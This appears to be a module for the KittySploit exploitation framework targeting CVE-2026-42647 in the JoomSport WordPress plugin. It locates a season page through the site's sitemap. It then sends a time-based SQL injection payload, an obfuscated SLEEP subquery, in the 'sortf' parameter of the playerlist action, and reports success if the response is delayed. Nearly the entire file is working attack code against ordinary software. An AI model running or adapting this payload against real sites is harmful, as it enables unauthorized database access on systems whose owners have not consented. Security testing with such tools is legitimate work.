#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JoomSport CVE-2026-42647 — sortf time-based SQLi."""

import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "JoomSport CVE-2026-42647 SQLi probe",
        "description": "GET playerlist with SLEEP payload in sortf.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-42647"],
        "tags": ["wordpress", "joomsport", "sqli", "cve-2026-42647"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    season_path = OptString("", "Season page path", required=False)
    sleep_seconds = OptInteger(8, "SLEEP seconds", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _season(self) -> str:
        sp = (self.season_path or "").strip()
        if sp:
            return sp if sp.startswith("/") else f"/{sp}"
        sm = self.http_request(
            method="GET",
            path=self._join("/wp-sitemap-posts-joomsport_season-1.xml"),
            allow_redirects=False,
        )
        m = re.search(r"<loc>[^<]*?//[^/]+(/[^<]+)</loc>", sm.text or "") if sm else None
        return m.group(1) if m else ""

    def run(self):
        season = self._season()
        if not season:
            print_error("season_path not found")
            return False
        sleep_s = int(self.sleep_seconds or 8)
        sortf = f"post_title`,(SELECT/**/x/**/FROM/**/(SELECT/**/SLEEP({sleep_s})/**/AS/**/x)/**/AS/**/t)#"
        start = time.monotonic()
        resp = self.http_request(
            method="GET",
            path=self._join(season),
            params={"action": "playerlist", "sortf": sortf, "sortd": "ASC"},
            allow_redirects=True,
            timeout=30,
        )
        elapsed = time.monotonic() - start
        if elapsed >= sleep_s - 1:
            print_success(f"Delayed ~{elapsed:.1f}s on playerlist")
            if resp:
                print_status((resp.text or "")[:200])
            return True
        print_error(f"No delay ({elapsed:.1f}s)")
        return False
